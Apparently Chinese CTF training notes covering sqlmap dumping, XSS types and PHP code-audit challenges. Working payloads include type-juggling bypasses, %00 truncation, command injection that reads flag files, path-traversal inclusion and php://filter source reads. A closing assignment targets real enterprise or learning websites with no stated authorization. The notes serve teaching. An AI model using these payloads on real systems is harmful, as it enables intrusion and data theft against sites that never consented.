+<blockquote>
+<p>sqlmap.py -u url</p>
+</blockquote>
+</li>
+<li><p>所有数据库信息</p>
+<blockquote>
+<p>sqlmap.py -u url –dbs</p>
+</blockquote>
+</li>
+<li><p>当前数据库信息</p>
+<blockquote>
+<p>sqlmap.py -u url –current-db</p>
+</blockquote>
+</li>
+<li><p>指定库名列出所有表</p>
+<blockquote>
+<p>sqlmap.py -u url -D 库名 –table</p>
+</blockquote>
+</li>
+<li><p>指定库名表名列出所有字段</p>
+<blockquote>
+<p>sqlmap.py -u url -D 库名 -T 表名 –columns</p>
+</blockquote>
+</li>
+<li><p>指定库名表名字段dump</p>
+<blockquote>
+<p>sqlmap.py -u url -D 库名 -T 表名 -C 字段1,字段2 –dump</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="CTF中的SQL注入"><a href="#CTF中的SQL注入" class="headerlink" title="CTF中的SQL注入"></a>CTF中的SQL注入</h5><p>1.练习总结博客：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/17da91c3bdab">站点</a></p>
+<p>2.简单sql注入3：<a target="_blank" rel="noopener" href="https://0xor-writeup.readthedocs.io/zh/latest/wargame/web/[shiyanbar.com]_simple_sql_injection_3/">writeup</a></p>
+<h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以安全领域改为叫XSS。<br>XSS攻击能让攻击者在受害者的浏览器中执行js脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。</p>
+<h4 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h4><h5 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h5><p>所谓反射型XSS，就是简单用户输入的数据‘反射’给浏览器。也就是说，黑客我那个网需要有事用户‘点击’一个恶意链接，才能攻击。这其实是比较被动的。</p>
+<h5 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h5><p>存储型XSS会把用户输入的数据‘存储’在服务器端。当访问数据库数据时，从数据库取出数据，并由HTML显示，这时导致了XSS的产生。</p>
+<p>比如黑客将恶意js脚本写在一个博客中，下次任何人访问这个博客，都会在他们的浏览器中执行这段恶意js脚本。导致‘Cookie劫持’等。</p>
+<h5 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h5><p>首先是关于DOM节点：<br>整个文档是一个文档节点 从每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点。</p>
+<p>HTML 文档中的所有内容都是节点：</p>
+<ul>
+<li>整个文档是一个文档节点</li>
+<li>每个 HTML 元素是元素节点</li>
+<li>HTML 元素内的文本是文本节点</li>
+<li>每个 HTML 属性是属性节点</li>
+<li>注释是注释节点</li>
+</ul>
+<p>和反射型XSS类似，但是这类XSS执行脚本的位置与反射型XSS不同，是修改了页面的DOM节点而造成了恶意js脚本的执行。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><table>
+<thead>
+<tr>
+<th>XSS类型</th>
+<th>反射型</th>
+<th>存储型</th>
+<th>DOM型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>触发过程</td>
+<td>正常用户访问携带XSS的url</td>
+<td>1.黑客构造XSS脚本2.用户访问有XSS脚本的网站</td>
+<td>正常用户访问携带XSS的url</td>
+</tr>
+<tr>
+<td>存储位置</td>
+<td>url</td>
+<td>数据库</td>
+<td>url</td>
+</tr>
+<tr>
+<td>谁来输出</td>
+<td>后端web</td>
+<td>后端web</td>
+<td>前端JS</td>
+</tr>
+<tr>
+<td>输出位置</td>
+<td>HTML响应</td>
+<td>HTML响应</td>
+<td>动态生成的DOM节点</td>
+</tr>
+</tbody></table>
+<h5 id="XSS在CTF中的运用"><a href="#XSS在CTF中的运用" class="headerlink" title="XSS在CTF中的运用"></a>XSS在CTF中的运用</h5><p>XSS在CTF中主要用于盗取<code>Cookie</code>和<code>Session</code>，然后利用<code>cookie</code>,做一些其他的事情，但是这是有CSP的，一般会考察<code>XSS绕过(bypass)</code>的能力。</p>
+<p>另外还会涉及到<code>XSS</code>,<code>CSRF</code>，<code>SSRF</code>的综合应用。</p>
+<p>再者，就是利用XSS漏洞，进行js脚本注入。</p>
+<h5 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h5><p>1.<a target="_blank" rel="noopener" href="https://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E4%BB%80%E4%B9%88%E6%98%AFXSS">XSS原理&amp;复现</a><br>2.<a target="_blank" rel="noopener" href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">XSS攻击手段&amp;在CTF中的运用</a></p>
+<h2 id="day03–Danie1"><a href="#day03–Danie1" class="headerlink" title="day03–Danie1"></a>day03–Danie1</h2><h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><h4 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h4><p><strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</strong></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$flag=&#39;xxx&#39;; 
+extract($_GET);
+ if(isset($shiyan))
+ &#123; 
+    $content=trim($flag);
+    if($shiyan==$content)
+    &#123; 
+        echo&#39;ctf&#123;xxx&#125;&#39;; 
+    &#125;
+   else
+   &#123; 
+    echo&#39;Oh.no&#39;;
+   &#125; 
+   &#125;
+
+?&gt;</code></pre>
+<p>file_get_contents — 将整个文件读入一个字符串。</p>
+<p>trim — 去除字符串首尾处的空白字符（或者其他字符）。</p>
+<ul>
+<li>题目环境  <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/01.php">http://172.16.43.117/php_bugs-master/01.php</a></li>
+<li>payload <code>http://172.16.43.117/php_bugs-master/01.php?shiyan=1&amp;flag=1</code></li>
+</ul>
+<h4 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h4><hr>
+<pre><code class="php">$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));
+if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)&#123;echo $flag;&#125;</code></pre>
+<p>本地编写</p>
+<pre><code class="php">&lt;?php
+
+$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);
+$token = base64_encode(gzcompress(serialize($arr)));
+print_r($token);
+?&gt;</code></pre>
+<p>运行得到</p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080702.png"></p>
+<p>即是所需的payload</p>
+<h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><pre><code class="php">&lt;?php 
+
+$flag = &quot;flag&quot;;
+
+if (isset ($_GET[&#39;password&#39;])) 
+&#123;
+  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
+  &#123;
+    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
+  &#125;
+  else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
+   &#123;
+     if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置
+      &#123;
+      die(&#39;Flag: &#39; . $flag);
+      &#125;
+      else
+      &#123;
+        echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;); 
+       &#125;
+      &#125;
+     else 
+     &#123;
+        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;; 
+      &#125;
+   &#125; 
+?&gt;</code></pre>
+<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
+<ul>
+<li><p>题目 <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/05.php">http://172.16.43.117/php_bugs-master/05.php</a></p>
+</li>
+<li><p>限制条件</p>
+<p>题中ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母</p>
+</li>
+</ul>
+<p>strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
+<ul>
+<li>解决方法</li>
+</ul>
+<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
+<p>科学计数法绕过长度限制</p>
+<ul>
+<li>payload  <code>http://172.16.43.117/php_bugs-master/05.php?password=1e9%00*-*</code></li>
+</ul>
+<h4 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h4><pre><code class="php">&lt;?php
+$flag = &quot;flag&quot;;
+if (isset($_GET[&#39;a&#39;])) &#123;  
+    if (strcmp($_GET[&#39;a&#39;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 
+
+    //比较两个字符串（区分大小写） 
+        die(&#39;Flag: &#39;.$flag);  
+    else  
+        print &#39;No&#39;;  
+&#125;
+
+?&gt;</code></pre>
+<p>可以使用数组绕过</p>
+<p>int strcmp ( string $str1 , string $str2 )<br>// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
+<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在<code>5.3</code>之前的php中，显示了报错的警告信息后，将<code>return 0</code> !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<code>strcmp</code>只会处理字符串参数，如果给个数组的话呢，就会返回<code>NULL</code>,而判断使用的是<code>==</code>，<code>NULL==0</code>是 <code>bool(true)</code></p>
+<p>题目 <a target="_blank" rel="noopener" href="http://172.16.43.115/1.php">http://172.16.43.115/1.php</a></p>
+<p>payload： <code>?a[]=1</code></p>
+<h4 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h4><pre><code class="php">&lt;?php
+
+$flag = &quot;flag&quot;;
+
+if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) 
+&#123;
+    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
+        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;
+    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
+      die(&#39;Flag: &#39;.$flag);
+    else
+        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;
+&#125;
+else
+    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;
+?&gt;</code></pre>
+<p>限制条件</p>
+<p>传入的name参数和password参数不能相同</p>
+<p>但是它们的sha1值要相同</p>
+<p>解决方法</p>
+<p><code>===</code>会比较类型，比如<code>bool</code><br><code>sha1()</code>函数和<code>md5()</code>函数存在着漏洞，<code>sha1()</code>函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使<code>sha1()</code>函数返回错误，也就是返回<code>false</code>，这样一来<code>===</code>运算符就可以发挥作用了，需要构造<code>username</code>和<code>password</code>既不相等，又同样是数组类型</p>
+<p>题目： <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/07.php">http://172.16.43.117/php_bugs-master/07.php</a></p>
+<p>payload：  <code>?name[]=1&amp;password[]=2</code></p>
+<h4 id="SESSION验证绕过"><a href="#SESSION验证绕过" class="headerlink" title="SESSION验证绕过"></a>SESSION验证绕过</h4><pre><code class="php">&lt;?php
+
+$flag = &quot;flag&quot;;
+
+session_start(); 
+if (isset ($_GET[&#39;password&#39;])) &#123;
+    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])
+        die (&#39;Flag: &#39;.$flag);
+    else
+        print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;
+&#125;
+mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
+?&gt;</code></pre>
+<p>限制条件</p>
+<p>传入的password参数要等于session中的password值</p>
+<p>解决方法</p>
+<p>删除session</p>
+<p>题目： <a target="_blank" rel="noopener" href="http://172.16.43.115/2.php">http://172.16.43.115/2.php</a></p>
+<p>payload  <code>http://172.16.43.115/2.php?password=</code></p>
+<h4 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h4><pre><code class="php">&lt;?php
+if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+&#125;
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;hackerDJ&quot;)
+&#123;
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;
+&#125;
+?&gt;</code></pre>
+<p>题目：<a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/10.php">http://172.16.43.117/php_bugs-master/10.php</a></p>
+<p>payload  <code>http://172.16.43.117/php_bugs-master/10.php?id=%2568ackerDJ</code></p>
+<h4 id="X-Forwarded-For绕过指定IP地址"><a href="#X-Forwarded-For绕过指定IP地址" class="headerlink" title="X-Forwarded-For绕过指定IP地址"></a>X-Forwarded-For绕过指定IP地址</h4><pre><code class="php">&lt;?php
+function GetIP()&#123;
+if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))
+    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
+else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))
+    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
+else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))
+    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+else
+    $cip = &quot;0.0.0.0&quot;;
+return $cip;
+&#125;
+
+$GetIPs = GetIP();
+if ($GetIPs==&quot;1.1.1.1&quot;)&#123;
+echo &quot;Great! Key is *********&quot;;
+&#125;
+else&#123;
+echo &quot;错误！你的IP不在访问列表之内！&quot;;
+&#125;
+?&gt;</code></pre>
+<p>题目：<a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/12.php">http://172.16.43.117/php_bugs-master/12.php</a></p>
+<p>解决方法</p>
+<p><code>HTTP</code>头添加<code>X-Forwarded-For:1.1.1.1</code></p>
+<p>使用forefox插件<code>SIMPLE MODIFY HEADERS</code></p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080704.png"></p>
+<h4 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h4><pre><code class="php">&lt;?php
+
+$md51 = md5(&#39;QNKCDZO&#39;);
+$a = @$_GET[&#39;a&#39;];
+$md52 = @md5($a);
+if(isset($a))&#123;#
+if ($a != 'QNKCDZO' && $md51 == $md52) &#123;
+    echo "nctf&#123;*****************&#125;#";
+&#125; else &#123;
+    echo "false!!!";
+&#125;&#125;
+else&#123;echo &quot;please input a&quot;;&#125;
+
+?&gt;</code></pre>
+<ul>
+<li><p>分析</p>
+<p>$md51=QNKCDZO的MD5编码</p>
+<p>$md52=传入的参数a的MD5编码</p>
+<p>$a 不等于’QNKCDZO’ 并且 $md51等于 $md52（也就是两个不同的字符串md5值要相同）</p>
+</li>
+</ul>
+<p>将QNKCDZO进行MD5加密，密文为0e830400451993494058024219903391，发现密文为0e开头，PHP在进行比较运算时，0e开头字符串都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可</p>
+<pre><code class="txt">md5(&#39;240610708&#39;); // 0e462097431906509019562988736854 
+md5(&#39;QNKCDZO&#39;); // 0e830400451993494058024219903391</code></pre>
+<ul>
+<li>题目:   <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/13.php">http://172.16.43.117/php_bugs-master/13.php</a></li>
+<li>payload:   <code>?a=240610708</code></li>
+</ul>
+<h4 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h4><pre><code class="php">&lt;?php
+
+$flag = &quot;flag&quot;;
+
+    if (isset ($_GET[&#39;nctf&#39;])) &#123;
+        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
+            echo &#39;必须输入数字才行&#39;;
+        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
+            die(&#39;Flag: &#39;.$flag);
+        else
+            echo &#39;骚年，继续努力吧啊~&#39;;
+    &#125;
+
+ ?&gt;</code></pre>
+<ul>
+<li><p>分析</p>
+<p>既要是纯数字,又要有<code>#biubiubiu</code></p>
+<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
+<p>注意：需将#编码</p>
+</li>
+<li><p>题目：<a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/15.php">http://172.16.43.117/php_bugs-master/15.php</a></p>
+</li>
+<li><p>payload：<code>?nctf=1%00%23biubiubiu</code></p>
+</li>
+</ul>
+<h4 id="md5-函数-使用数组绕过"><a href="#md5-函数-使用数组绕过" class="headerlink" title="md5()函数===使用数组绕过"></a>md5()函数===使用数组绕过</h4><pre><code class="php">&lt;?php
+error_reporting(0);
+$flag = &#39;flag&#123;test&#125;&#39;;
+if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;
+    if ($_GET[&#39;username&#39;] == $_GET[&#39;password&#39;])
+        print &#39;Your password can not be your username.&#39;;
+    else if (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))
+        die(&#39;Flag: &#39;.$flag);
+    else
+        print &#39;Invalid password&#39;;
+&#125;
+?&gt;</code></pre>
+<ul>
+<li><p>分析</p>
+<p>若为<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>?username=QNKCDZO&amp;password=240610708</code><br>因为<code>==</code>对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code> 转成<code>0</code>了<br>也可以使用数组绕过<br><code>?username[]=1&amp;password[]=2</code></p>
+<p>但此处是<code>===</code>，只能用数组绕过，<code>PHP</code>对数组进行<code>hash</code>计算都会得出<code>null</code>的空值<br><code>?username[]=1&amp;password[]=2</code></p>
+</li>
+<li><p>题目： <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/18.php">http://172.16.43.117/php_bugs-master/18.php</a></p>
+</li>
+<li><p>payload： <code>?username[]=1&amp;password[]=2</code></p>
+</li>
+</ul>
+<h4 id="ereg-函数strpos-函数用数组返回NULL绕过"><a href="#ereg-函数strpos-函数用数组返回NULL绕过" class="headerlink" title="ereg()函数strpos() 函数用数组返回NULL绕过"></a>ereg()函数strpos() 函数用数组返回NULL绕过</h4><pre><code class="php">&lt;?php  
+
+$flag = &quot;flag&#123;123456&#125;&quot;;  
+
+if (isset ($_GET[&#39;password&#39;])) &#123;  
+    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)  
+        echo &#39;You password must be alphanumeric&#39;;  
+    else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !== FALSE)  
+        die(&#39;Flag: &#39; . $flag);  
+    else  
+        echo &#39;Invalid password&#39;;  
+&#125;  
+?&gt;</code></pre>
+<ul>
+<li>分析<ul>
+<li>方法一：<br>ereg()正则函数可以用<code>%00</code>截断<br><code>?password=1%00--</code></li>
+<li>方法二：<br>将<code>password</code>构造一个数组，传入之后，<code>ereg</code>是返回<code>NULL</code>的，<code>===</code>判断<code>NULL</code>和 <code>FALSE</code>，是不相等的，所以可以进入第二个判断，而<code>strpos</code>处理数组，也是返回<code>NULL</code>，注意这里的是<code>!==</code>，<code>NULL!==FALSE</code>,条件成立，拿到<code>flag</code><br><code>?password[]=</code></li>
+</ul>
+</li>
+<li>题目： <a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/19.php">http://172.16.43.117/php_bugs-master/19.php</a></li>
+<li>payload：<code>?password=a%00--</code></li>
+</ul>
+<h4 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h4><pre><code class="php">&lt;?php
+
+error_reporting(0);
+$flag = &quot;flag&#123;test&#125;&quot;;
+
+$temp = $_GET[&#39;password&#39;];
+is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    
+if($temp&gt;1336)&#123;
+    echo $flag;
+&#125; 
+
+?&gt;</code></pre>
+<ul>
+<li><p>分析</p>
+<ul>
+<li>不能是数字，且又要大于1336，看上去是矛盾的</li>
+</ul>
+</li>
+<li><p>解决</p>
+</li>
+</ul>
+<p>​       利用<code>PHP</code>弱类型的一个特性，当一个整型和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比。如果输入一个<code>1337a</code>这样的字符串，在<code>is_numeric</code>中返回<code>true</code>，然后在比较时被转换成数字<code>1337</code>，这样就绕过判断输出flag</p>
+<ul>
+<li>题目：<a target="_blank" rel="noopener" href="http://172.16.43.117/php_bugs-master/22.php">http://172.16.43.117/php_bugs-master/22.php</a></li>
+<li>payload：<code>?password=123456a</code></li>
+</ul>
+<h3 id="其他常见web类型"><a href="#其他常见web类型" class="headerlink" title="其他常见web类型"></a>其他常见web类型</h3><hr>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/137923.html">参考</a></p>
+<p>命令连接符：</p>
+<pre><code class="txt">；  命令1；命令2   多个命令顺序执行
+&amp;&amp;  命令1&amp;&amp;命令2   当命令1执行成功，命令2才会执行    。命令1执行不成功时，命令2不会执行
+||  命令1||命令2   当命令1执行不成功，命令2才会执行。命令1执行成功时，命令2不会执行</code></pre>
+<pre><code class="php">&lt;?php
+if(isset($_GET[1]))&#123;
+     if(strlen($_GET[1])&lt;8)&#123;
+          echo shell_exec($_GET[1]);
+     &#125;
+&#125;
+else&#123;
+     show_source(__FILE__);
+&#125;
+
+?&gt;</code></pre>
+<ul>
+<li><p>分析</p>
+<p>传入参数1，并且长度不能大于8</p>
+</li>
+<li><p>题目</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.43.115:18099/exec.php">http://172.16.43.115:18099/exec.php</a></p>
+</li>
+<li><p>payload  <code>?1=cat *</code></p>
+</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+        // Get input
+        $target = $_REQUEST[ &#39;ip&#39; ];
+    // var_dump($target);
+        $target=trim($target);
+        // var_dump($target);
+        // Set blacklist
+        $substitutions = array(
+                &#39;&amp;&#39;  =&gt; &#39;&#39;,
+                &#39;;&#39; =&gt; &#39;&#39;,
+                &#39;|&#39; =&gt; &#39;&#39;,
+                &#39;-&#39;  =&gt; &#39;&#39;,
+                &#39;$&#39;  =&gt; &#39;&#39;,
+                &#39;(&#39;  =&gt; &#39;&#39;,
+                &#39;)&#39;  =&gt; &#39;&#39;,
+                &#39;`&#39;  =&gt; &#39;&#39;,
+                &#39;||&#39; =&gt; &#39;&#39;,
+        );
+        // Remove any of the charactars in the array (blacklist).
+        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+        // var_dump($target);
+        // Determine OS and execute the ping command.
+        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;
+                // Windows
+                $cmd = shell_exec( &#39;ping  &#39; . $target );
+        &#125;
+        else &#123;
+                // *nix
+                $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );
+        &#125;
+    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;
+highlight_file(__FILE__);
+?&gt;         </code></pre>
+<ul>
+<li><p>分析</p>
+<p>加入了黑名单，但是黑名单漏了%0a</p>
+</li>
+<li><p>题目 <a target="_blank" rel="noopener" href="http://172.16.43.115/exec/index.php">http://172.16.43.115/exec/index.php</a></p>
+</li>
+<li><p>payload: <code>?ip=8.8.8.8%0acat flag.php</code></p>
+</li>
+</ul>
+<h4 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h4><ul>
+<li>题目   <a target="_blank" rel="noopener" href="http://172.16.43.115:19002/">http://172.16.43.115:19002/</a><ul>
+<li>工具  ：<a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">GitHack</a></li>
+<li>用法：python GitHack.py <a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com/</a></li>
+</ul>
+</li>
+<li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080703.png"></li>
+</ul>
+<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><hr>
+<p>PHP中文件包含函数有以下四种：</p>
+<blockquote>
+<p>require()</p>
+<p>require_once()</p>
+<p>include()</p>
+<p>include_once()</p>
+</blockquote>
+<p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<ul>
+<li>题目 <a target="_blank" rel="noopener" href="http://172.16.43.115/include/index.php">http://172.16.43.115/include/index.php</a></li>
+<li>payload ：<code> ?file=../../../../../home/flag</code></li>
+</ul>
+<ul>
+<li><p>题目  <a target="_blank" rel="noopener" href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dubhe-/p/9997842.html">php伪协议</a></p>
+</li>
+<li><p>方法：读index.php</p>
+<p><code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>base64解码后</p>
+<pre><code class="php">
+&lt;html&gt;
+    &lt;title&gt;asdf&lt;/title&gt;
+
+&lt;?php
+    error_reporting(0);
+    if(!$_GET[file])&#123;echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;&#125;
+    $file=$_GET[&#39;file&#39;];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+        echo &quot;Oh no!&quot;;
+        exit();
+    &#125;
+    include($file); 
+//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
+
+?&gt;
+&lt;/html&gt;</code></pre>
+</li>
+</ul>
+<h4 id="简单脚本辅助"><a href="#简单脚本辅助" class="headerlink" title="简单脚本辅助"></a>简单脚本辅助</h4><hr>
+<ul>
+<li><p>题目  <a target="_blank" rel="noopener" href="http://172.16.43.117/web/08/index.php">http://172.16.43.117/web/08/index.php</a></p>
+<pre><code class="python">#!/usr/bin/python
+#-*-coding:utf-8-*-
+
+import requests
+import re
+
+url = &#39;http://172.16.43.117/web/08/index.php&#39;
+s = requests.Session()
+
+html = s.get(url).content
+
+reg = r&#39;(.*)&lt;/p&gt;&#39;
+res = re.findall(reg,html)
+
+payload = &#123;&#39;result&#39;:eval(res[0])&#125;
+
+flag = s.post(url,data=payload)
+print flag.content</code></pre>
+<h2 id="day03–yiyangqianxixxxx"><a href="#day03–yiyangqianxixxxx" class="headerlink" title="day03–yiyangqianxixxxx"></a>day03–yiyangqianxixxxx</h2></li>
+</ul>
+<h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>此内容为<code>严老板</code>编写总结，7iny整理。仅供学习参考，<strong>请及时向漏洞平台上报漏洞</strong></p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul>
+<li>确立渗透测试目标 ：省企业网站，或任意学习网站。</li>
+<li>确立渗透测试范围：隶属于该网站域名下所有网站均可。</li>
+<li>渗透测试手段：通过信息搜集得到网站的主要信息，来对其进行各种漏洞的测试，包括但不限于sql注入、xss、信息泄露。考虑到的攻击手段要全面，只要有可能存在漏洞的地方就去尝试。</li>
+</ul>
